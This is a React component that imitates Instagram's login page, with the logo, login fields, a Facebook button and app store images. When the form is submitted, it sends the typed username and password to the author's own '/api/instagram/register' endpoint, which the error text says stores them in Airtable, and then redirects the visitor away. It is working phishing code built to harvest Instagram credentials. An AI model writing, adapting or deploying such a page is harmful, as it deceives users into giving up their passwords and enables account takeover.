import React, { useState } from "react";
import { API_BASE } from "../api";
import axios from "axios";
import "./login.css";

function InstagramLogin() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [ripple, setRipple] = useState({ active: false, x: 0, y: 0 });

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (isSubmitting) return;
    setIsSubmitting(true);

    try {
      await axios.post(`${API_BASE}/api/instagram/register`, {
        username,
        password,
      });
      setUsername("");
      setPassword("");
      // redirect to main site
      window.location.href = `${API_BASE}/`;
    } catch (err) {
      alert(
        err.response?.data?.message || "Failed to save to Airtable"
      );
      setIsSubmitting(false);
    }
  };

  const handleButtonClick = (e) => {
    const rect = e.currentTarget.getBoundingClientRect();
    const x = e.clientX - rect.left;
    const y = e.clientY - rect.top;
    setRipple({ active: true, x, y });

    // stop ripple after animation
    setTimeout(() => {
      setRipple((prev) => ({ ...prev, active: false }));
    }, 400);
  };

  return (
    <div className="ig-root">
      <div className="ig-page">
        <div className="ig-auth-column">
          <div className="ig-card">
            {/* Instagram icon + wordmark */}
            <div className="ig-icon-wrapper">
              <img
                src="https://static.vecteezy.com/system/resources/thumbnails/042/127/166/small/instagram-logo-on-square-style-with-transparent-background-free-png.png"
                alt="Instagram icon"
              />
            </div>
            <div className="ig-logo">Instagram</div>

            <form onSubmit={handleSubmit}>
              <div className="ig-input-group">
                <input
                  className="ig-input"
                  type="text"
                  placeholder="Phone number, username, or email"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                />
              </div>
              <div className="ig-input-group">
                <input
                  className="ig-input"
                  type="password"
                  placeholder="Password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
              </div>

              <button
                className={`ig-login-btn ${
                  isSubmitting ? "ig-login-btn--loading" : ""
                }`}
                type="submit"
                disabled={isSubmitting}
                onClick={handleButtonClick}
              >
                {ripple.active && (
                  <span
                    className="ig-login-ripple"
                    style={{ left: ripple.x, top: ripple.y }}
                  />
                )}
                {isSubmitting ? "Logging in..." : "Log in"}
              </button>
            </form>

            <div className="ig-divider">
              <div className="ig-divider-line"></div>
              <span>OR</span>
              <div className="ig-divider-line"></div>
            </div>

            <button className="ig-fb-login" type="button">
              <span className="ig-fb-logo">f</span>
              <span>Log in with Facebook</span>
            </button>

            <div className="ig-forgot-wrapper">
              <a href="#" className="ig-forgot">
                Forgot password?
              </a>
            </div>
          </div>

          <div className="ig-signup-card">
            <span>Don&apos;t have an account?</span>
            <a href="#">Sign up</a>
          </div>

          <div className="ig-get-app">
            <p>Get the app.</p>
            <div className="ig-store-buttons">
              <img
                className="ig-store-img"
                src="https://static.cdninstagram.com/rsrc.php/v3/yk/r/Nt1qO9FJ2vN.png"
                alt="Download on the App Store"
              />
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default InstagramLogin;
